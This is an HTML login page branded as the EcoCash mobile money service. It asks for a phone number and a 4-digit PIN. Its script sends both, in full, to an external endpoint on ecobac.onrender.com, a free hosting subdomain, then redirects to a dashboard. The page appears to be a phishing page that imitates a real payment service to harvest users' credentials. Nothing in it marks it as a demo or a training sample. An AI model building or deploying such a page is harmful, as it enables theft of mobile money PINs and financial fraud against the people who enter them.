<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Login</title>

<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f6f8;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .login-container {
        background: #ffffff;
        width: 380px;
        padding: 30px 25px;
        border-radius: 10px;
        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.1);
    }

    .login-header {
        text-align: center;
        font-size: 24px;
        font-weight: bold;
        color: #007cba;
        margin-bottom: 20px;
    }

    .login-field {
        margin-bottom: 18px;
    }

    .login-field label {
        font-size: 14px;
        color: #555;
    }

    .login-field input {
        width: 100%;
        padding: 10px;
        margin-top: 6px;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 16px;
    }

    .login-field input:focus {
        border-color: #007cba;
        outline: none;
    }

    .btn-login {
        width: 100%;
        padding: 12px;
        background-color: #007cba;
        color: #ffffff;
        font-size: 16px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        margin-top: 10px;
    }

    .btn-login:hover {
        background-color: #005f8d;
    }
</style>
</head>

<body>

<div class="login-container">
    <div class="login-header">EcoCash Login</div>

    <form id="loginForm">
        <div class="login-field">
            <label>Mobile Number</label>
            <input
                type="text"
                id="phone"
                placeholder="07XXXXXXXX"
                required
                pattern="07[0-9]{8}"
                title="Phone number must start with 07 and be 10 digits">
        </div>

        <div class="login-field">
            <label>4-Digit PIN</label>
            <input
                type="password"
                id="pin"
                placeholder="****"
                required
                maxlength="4"
                inputmode="numeric"
                pattern="[0-9]{4}"
                title="PIN must be exactly 4 digits">
        </div>

        <button type="submit" class="btn-login">Continue</button>
    </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const phone = document.getElementById("phone").value.trim();
    const pin = document.getElementById("pin").value.trim();

    if (!phone || !pin || !/^[0-9]{4}$/.test(pin)) {
        alert("Please enter a valid phone and 4-digit PIN");
        return;
    }

    try {
        const response = await fetch("https://ecobac.onrender.com/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });

        const data = await response.json();
        console.log(data);

        if (response.ok) {
            // Redirect to dashboard
            window.location.href = "dashboard.html";
        } else {
            alert(data.message);
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Something went wrong. Check the console.");
    }
});
</script>


</body>
</html>
